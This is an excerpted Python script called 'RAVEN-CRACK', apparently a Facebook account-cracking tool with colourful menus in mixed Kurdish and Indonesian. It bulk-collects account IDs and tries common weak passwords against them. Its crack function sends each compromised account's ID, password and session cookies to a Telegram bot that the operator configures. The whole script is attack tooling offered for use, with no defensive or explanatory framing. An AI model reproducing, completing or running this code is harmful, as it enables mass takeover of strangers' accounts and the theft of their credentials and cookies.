...
g= datetime.datetime(2024, 1,18 , 12, 00 ,0)
...
toko = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
print('\n')
idoo = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
...
def menu(my_name,my_id):	
	...
	print(der['Date'])
	print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
	print('----------------------[ R A V E N - C R A C K ]----------------------')
	print(' ╭─────────────────────────────────────────────╮')
	print(' │ [ 1 ]  ᑕᖇᗩᑕK ᑭᑌᗷᒪIᑕ   │     ')
	print(' │ [ 2 ]  ᑕᖇᗩᑕK ᖴᏆしᗴ     │     ')
	print(' ╰─────────────────────────────────────────────╯ ')
	_____rifan__ganteng_____ = input('   CHOICE MENU  : ')
	if _____rifan__ganteng_____ in ['1']:
		...
		print('└─ Sukses Logout+ Dwbara Kare Pe Bka ')
		exit()
	else:
		print('└─ Choose : ')
		back()
...
def dump_massal():
	...
	try:
		...
		kumpulkan = int(input(f' NUMBER OF IDS :- '))
		print('\x1b[28;4;408m\x1b[37m\033[93m\x1b[38;5;190m°°°'*20)
...
def setting():
    #print('')
	print(f'\n 1. Crack Old 2.   Crack Muda   3. Crack Random  ')
	hu = input(' ✔ Choose : ')
	if hu in ['1','01']:
	...
	print('----------------------[ R A V E N - C R A C K ]----------------------')
	print('')
	print('  1. Mobile    2. Beta   3. Mtouch  ') 
	hc = input(' ✔ Choose : ')
	print('')
	print('----------------------[ R A V E N - C R A C K ]----------------------')
	print('')
	...
	#print('_'*51)
	#_jembot_ = input(' DATAWET APP DEARBET [ Y | T ] ')
...
#	uaplus=input(' USER AGWNT DADANE [ T ] ')
	
#	if uaplus in ['y','Y']:
#		uapluss.append('ya')
#		uaku=input('USER AGWNT DANE : ')
#		uakuh=uaku.split(',')
#		for xua in uakuh:
#			uanya.append(xua)
#	else:
#		uapluss.append('no')
#	pwplus=input('PASSWORD BO ZYAD DAKAY [ Y | T ] ')
	
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		print('='*51)
#		print(' 1234 | 12345 | 123456 | 12341234 | 1234554321')
#		pwku=input(' PASS DANE : ')
#		print('='*51)
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
...
#	print(f'>> On / Of Airplane Mod  {m}500{x} Idz')
#	print('='*51)
	...
	print('='*51)
	print(' Tolaka Dubara Dakayawa... [ Y | T ] ')
	print('='*51)
	woi = input(' Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'Good Bye And Join Channel{x} ')
		print('='*51)
		time.sleep(2)
		exit()
		print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r        R {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get(f"https://api.telegram.org/bot{toko}/sendMessage?chat_id={idoo}&text=New Account Fac \n--------------------------------\nID : {idf}\nPASS : {pw}\n--------------------------------\n COOKIES : \n--------------------------------\n{kuki} ")
				break
